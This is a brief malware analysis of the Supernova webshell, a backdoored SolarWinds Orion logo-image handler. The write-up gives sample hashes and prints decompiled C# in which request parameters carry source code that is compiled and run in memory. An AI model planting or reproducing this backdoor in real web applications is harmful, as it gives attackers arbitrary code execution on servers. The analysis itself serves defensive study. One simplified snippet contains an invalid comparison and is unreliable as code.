# Supernova Analysis

- [Supernova Analysis](#supernova-analysis)
  - [Sample HASH](#sample-hash)
- [Analysis](#analysis)
  - [ProcessRequest](#processrequest)
  - [DynamicRun](#dynamicrun)
- [Source](#source)

## Sample HASH 

    MD5     56ceb6d0011d87b6e4d7023d7ef85676
    SHA-1   75af292f34789a1c782ea36c7127bf6106f595e8
    SHA-256 c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71 
# Analysis

The webshell is only 92 lines and as two methods:
- ProcessRequest
- DynamicRun


## ProcessRequest

HTTP Query String Params:
- clazz
- method
- args
- codes

```C#
string str2;
if(buffer.Length < 2 || buffer[0] != byte.MaxValue || buffer[1] != (byte) 216){
    if(buffer.Length < 3 || buffer != "GIF"){
        if(buffer.Length < 8 || buffer[0] != (byte) 137 || (buffer[1] != 'P' || buffer[2] != 'N') || (buffer[3] != 'G' || buffer[4] != (byte) 13 || (buffer[5] != (byte) 10 || buffer[6] != (byte) 26)) || buffer[7] != (byte) 10)
            str2 = "image/jpeg";
        else
            str2 = "image/png";
    }else
        str2 = "image/gif";
}else
    str2 = "image/jpeg";
```

```C#
public void ProcessRequest(HttpContext context)
  {
    try
    {
      string codes = context.Request["codes"];
      string clazz = context.Request["clazz"];
      string method = context.Request["method"];
      string[] args = context.Request["args"].Split('\n');
      context.Response.ContentType = "text/plain";
      context.Response.Write(this.DynamicRun(codes, clazz, method, args));
    }
    catch (Exception ex)
    {
    }
    NameValueCollection queryString = HttpUtility.ParseQueryString(context.Request.Url.Query);
    try
    {
      string str1 = queryString["id"];
      string s;
      if (!(str1 == "SitelogoImage"))
      {
        if (!(str1 == "SiteNoclogoImage"))
          throw new ArgumentOutOfRangeException(queryString["id"]);
        s = WebSettingsDAL.get_NewNOCSiteLogo();
      }
      else
        s = WebSettingsDAL.get_NewSiteLogo();
      byte[] buffer = Convert.FromBase64String(s);
      if ((buffer == null || buffer.Length == 0) && File.Exists(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif")))
        buffer = File.ReadAllBytes(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif"));
      string str2 = buffer.Length < 2 || buffer[0] != byte.MaxValue || buffer[1] != (byte) 216 ? (buffer.Length < 3 || buffer[0] != (byte) 71 || (buffer[1] != (byte) 73 || buffer[2] != (byte) 70) ? (buffer.Length < 8 || buffer[0] != (byte) 137 || (buffer[1] != (byte) 80 || buffer[2] != (byte) 78) || (buffer[3] != (byte) 71 || buffer[4] != (byte) 13 || (buffer[5] != (byte) 10 || buffer[6] != (byte) 26)) || buffer[7] != (byte) 10 ? "image/jpeg" : "image/png") : "image/gif") : "image/jpeg";
      context.Response.OutputStream.Write(buffer, 0, buffer.Length);
      context.Response.ContentType = str2;
      context.Response.Cache.SetCacheability(HttpCacheability.Private);
      context.Response.StatusDescription = "OK";
      context.Response.StatusCode = 200;
      return;
    }
    catch (Exception ex)
    {
      LogoImageHandler._log.Error((object) "Unexpected error trying to provide logo image for the page.", ex);
    }
    context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
    context.Response.StatusDescription = "NO IMAGE";
    context.Response.StatusCode = 500;
  }
```
## DynamicRun

This function will recv a C# code that will but compile and the run in the memory.

```C#
public string DynamicRun(string codes, string clazz, string method, string[] args)
{
  ICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();
  CompilerParameters options = new CompilerParameters();
  options.ReferencedAssemblies.Add("System.dll");
  options.ReferencedAssemblies.Add("System.ServiceModel.dll");
  options.ReferencedAssemblies.Add("System.Data.dll");
  options.ReferencedAssemblies.Add("System.Runtime.dll");
  options.GenerateExecutable = false;
  options.GenerateInMemory = true;
  string source = codes;
  CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, source);
  if (compilerResults.Errors.HasErrors)
  {
      string.Join(Environment.NewLine, compilerResults.Errors.Cast<CompilerError>().Select<CompilerError, string>((Func<CompilerError, string>) (err => err.ErrorText)));
      Console.WriteLine("error");
      return compilerResults.Errors.ToString();
  }
  object instance = compilerResults.CompiledAssembly.CreateInstance(clazz);
  return (string) instance.GetType().GetMethod(method).Invoke(instance, (object[]) args);
}
```

# Source

    https://labs.sentinelone.com/solarwinds-understanding-detecting-the-supernova-webshell-trojan/
    https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/
    https://unit42.paloaltonetworks.com/solarstorm-supernova/

    https://www.virustotal.com/gui/file/c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71/community
    https://app.any.run/tasks/40a1bf55-7b07-467f-8fbd-3442c62fb096/#
    https://www.joesandbox.com/analysis/333400/0/html
